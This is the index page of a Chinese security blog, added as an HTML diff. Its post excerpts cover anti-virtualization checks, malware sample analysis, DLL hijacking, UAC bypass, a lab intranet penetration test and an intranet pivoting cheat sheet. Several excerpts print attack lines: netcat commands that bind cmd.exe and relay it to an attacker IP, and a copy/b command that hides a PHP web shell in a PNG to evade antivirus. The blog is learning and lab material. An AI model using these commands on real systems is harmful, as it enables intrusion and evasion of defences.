@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>J47erry&#39;S BLOG | 杰歪</title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="header">
+    <a class="logo" href="/">J47erry&#39;S BLOG</a>
+    <ul class="nav">
+        
+        <li><a href="/">首页</a></li>
+        
+        <li><a href="/archives">归档</a></li>
+        
+        <li><a href="/about">关于</a></li>
+        
+    </ul>
+</div>
+                
+                <div class="post-list">
+    
+    <div class="post">
+        <a class="post-title" href="/2024/11/08/Anti-virtualization%EF%BC%88%E9%99%84CVE-2024-37081%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%89/"></a>
+        <div class="post-except">
+            本文首发于先知社区，原文链接：Anti-virtualization（附CVE-2024-37081漏洞解析） - 先知社区
+反调试和反虚拟技术都是通过检查系统中调试器或者虚拟机的行为特征来判断是否存在该检测环境下，不同的是调试器是软件级别，虚拟机是硬件级别。
+VMware痕迹
+进程列表
+
+可以使用Process32First，Process32Next等Windows API函数列举系统中的进程列表，主要是为了探测是否存在虚拟机的痕迹：
+Vmware:
+Vmtoolsd.e
+            <a class="read-more" href="/2024/11/08/Anti-virtualization%EF%BC%88%E9%99%84CVE-2024-37081%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%89/"> ... </a>
+        </div>
+        <div class="post-date">2024.11.08</div>
+    </div>
+    
+    <div class="post">
+        <a class="post-title" href="/2024/11/07/%E4%BB%8E%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E4%B8%AD%E5%AD%A6%E4%B9%A0%E7%97%85%E6%AF%92%E9%87%8A%E6%94%BE%E8%BF%87%E7%A8%8B/">#从样本分析中学习病毒释放过程</a>
+        <div class="post-except">
+            
+本文首发于先知社区，原文链接：https://xz.aliyun.com/t/16027?time__1311=GuD%3DYK0KBI8x%2FD0ltd0QritEZ8sjAeD
+静态分析通过编写的py脚本，对目标样本先进行简单的静态分析，
+Section
+对样本的结构有了大致了解，结构呈现完整，虚拟内存和内存大小没有发现明显异常，初步判断可能没有加壳，可以通过工具分析，这里只是为了练手。
+具体代码如下：
+import pefile
+pe = pefile.PE(&qu
+            <a class="read-more" href="/2024/11/07/%E4%BB%8E%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E4%B8%AD%E5%AD%A6%E4%B9%A0%E7%97%85%E6%AF%92%E9%87%8A%E6%94%BE%E8%BF%87%E7%A8%8B/"> ... </a>
+        </div>
+        <div class="post-date">2024.11.07</div>
+    </div>
+    
+    <div class="post">
+        <a class="post-title" href="/2022/12/10/Dll%E5%8A%AB%E6%8C%81%E5%88%9D%E4%BD%93%E9%AA%8C/">#Dll劫持初体验</a>
+        <div class="post-except">
+            Dll劫持初体验DLL：动态链接库。DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于促进代码重用和内存的有效使用。dll文件和exe文件一样都是PE文件。
+为什么可以dll劫持主要是因为Windows的资源共享机制。为了尽可能多得安排资源共享，微软建议多个应用程序共享的任何模块应该放在Windows的
+            <a class="read-more" href="/2022/12/10/Dll%E5%8A%AB%E6%8C%81%E5%88%9D%E4%BD%93%E9%AA%8C/"> ... </a>
+        </div>
+        <div class="post-date">2022.12.10</div>
+    </div>
+    
+    <div class="post">
+        <a class="post-title" href="/2022/12/05/Bypass-UAC%E4%B9%8B%E5%88%9D%E4%BD%93%E9%AA%8C/">#Bypass UAC之初体验</a>
+        <div class="post-except">
+            0x01 UAC白名单首先，如果父进程和子进程之间存在关系，即子进程从父进程中继承访问令牌，就可以绕过UAC，这是绕过UAC基础。
+任何需要管理员访问令牌的程序都必须征得同意(即UAC弹窗)，但是存在一些具有白名单机制的系统程序，这些程序将会自动提升到管理员权限进行运行。因此，可以通过这些白名单来bypass UAC，以便获得高权限。
+微软官方提供的Sigcheck和Strings工具，可以用来寻找白名单程序。
+String：  &#x2F;&#x2F;可以查找所有白名单程序
+            <a class="read-more" href="/2022/12/05/Bypass-UAC%E4%B9%8B%E5%88%9D%E4%BD%93%E9%AA%8C/"> ... </a>
+        </div>
+        <div class="post-date">2022.12.05</div>
+    </div>
+    
+    <div class="post">
+        <a class="post-title" href="/2022/11/24/%E9%9A%90%E5%86%99%E6%9C%AF/">#隐写过360、火绒</a>
+        <div class="post-except">
+            隐写过360、火绒一些简单的隐写demo过静态免杀。
+
+0x00 图种利用copy命令，可以将两个文件以二进制方式连接起来，很显然，也可以将木马插入到图片里面，尝试隐写。
+copy/b C:\...\...\Desktop\OIP-A.png + C:\...\...\Desktop\shell.php 123.png
+
+生成123.png图片里面就会存在连接密码。
+通过360和火绒查杀，并没有检查出病毒。
+上传看看。（感觉VT结果怪怪的。。。）
+换成简单的一句话木马，试试。
+            <a class="read-more" href="/2022/11/24/%E9%9A%90%E5%86%99%E6%9C%AF/"> ... </a>
+        </div>
+        <div class="post-date">2022.11.24</div>
+    </div>
+    
+    <div class="post">
+        <a class="post-title" href="/2022/11/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6/">#记一次多层内网渗透</a>
+        <div class="post-except">
+            记一次多层内网渗透好久之前的一次很简单内网靶场的打靶。
+ ip扫描
+查看开放的端口服务，发现存在web服务的80端口。
+
+进行访问web网页，是thinkphp框架，可以进行工具盲打。
+写入一句话木马。然后访问写入的木马，结果发现木马post被过滤。
+将一句话木马进行base64编码，尝试绕过。
+木马写入，进行蚁剑连接。
+
+连接以后，执行终端发现只是普通权限。利用kali生成木马进行反弹上线。
+设置msf监听
+msfconsole
+
+use exploit/multi/han
+            <a class="read-more" href="/2022/11/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6/"> ... </a>
+        </div>
+        <div class="post-date">2022.11.15</div>
+    </div>
+    
+    <div class="post">
+        <a class="post-title" href="/2022/06/22/%E6%9F%90%E6%9F%90%E5%AE%89%E6%9C%8D%E5%AE%9E%E4%B9%A0%E7%94%9F%E9%9D%A2%E8%AF%95/">#某某安服实习生面试</a>
+        <div class="post-except">
+            某某安服实习生面试啊~懒得整理了 发一下技术面（只对岗位分类，公司就不说了）
+自我感觉回答的还OK，面试官也不错，整体面试感觉嘎嘎棒
+拿到小厂offer了，虽然我也没投大厂，还是太菜了
+安服&#x2F;渗透对内网了解到哪里呢？
+是自己搞还是跟着别人一起搞？在团队里面负责干嘛呢？
+打内网主要是用过什么工具？简单说一下
+你打过哪些单位的内网？多吗？
+接触网络安全到现在多久了呀？
+学习是跟学校的人一起？还是什么？
+你学过哪些技能？
+接触过的数据库主要是mysql嘛？除此之外还有什么
+            <a class="read-more" href="/2022/06/22/%E6%9F%90%E6%9F%90%E5%AE%89%E6%9C%8D%E5%AE%9E%E4%B9%A0%E7%94%9F%E9%9D%A2%E8%AF%95/"> ... </a>
+        </div>
+        <div class="post-date">2022.06.22</div>
+    </div>
+    
+    <div class="post">
+        <a class="post-title" href="/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/">#内网渗透备忘录</a>
+        <div class="post-except">
+            0x00 前言接触安全数月有余，整理一下内网学习笔记。
+0x01 内网穿透#nc内网穿透&#x2F;&#x2F;攻击机执行
+nc -lvp 3333
+
+&#x2F;&#x2F;目标机执行
+nc -lvp 3333 -e c:\windows\system32\cmd.exe
+
+&#x2F;&#x2F;中间机执行  
+ nc -v 攻击机ip 3333 -e “nc -v 目标机ip 3333”
+
+#frp内网穿透配置&#x2F;&#x2F;内网机器上安装frpc，并修改 fr
+            <a class="read-more" href="/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/"> ... </a>
+        </div>
+        <div class="post-date">2022.05.22</div>
+    </div>
+    
+    <div class="post">
+        <a class="post-title" href="/2021/12/31/%E8%87%B4%E6%95%AC%E6%88%91%E8%BF%99%E6%B7%B7%E6%B2%8C%E7%9A%842021/">#致敬我这混沌的2021</a>
+        <div class="post-except">
+            致敬我这混沌的2021尽管在我看来我的2021好像与前十几年并没有什么不同，终归都是浑浑噩噩，混混沌沌，但临近年末，看着大佬们的年度总结，感慨万千，思来想去总归是该写点文字来纪念2021的。
+对标or@nge神的年度总结，本人在技术，学习以及其他方面好像没有特别能够拿出来详细总结说说。因此，这段文字只是用来记录这个时刻这个阶段的思想态度吧，希望走了一段时间后，能有参照物看看自己的思想变化。
+0x00 伊始2021好像是以我转专业到计算机学院开始的。对于非得转专业的缘由，我好像
+            <a class="read-more" href="/2021/12/31/%E8%87%B4%E6%95%AC%E6%88%91%E8%BF%99%E6%B7%B7%E6%B2%8C%E7%9A%842021/"> ... </a>
+        </div>
+        <div class="post-date">2021.12.31</div>
+    </div>
+    
+</div>
+
+                <div class="footer">
+    <span>Copyright © 2022 J47erry&#39;S BLOG</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這Li</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
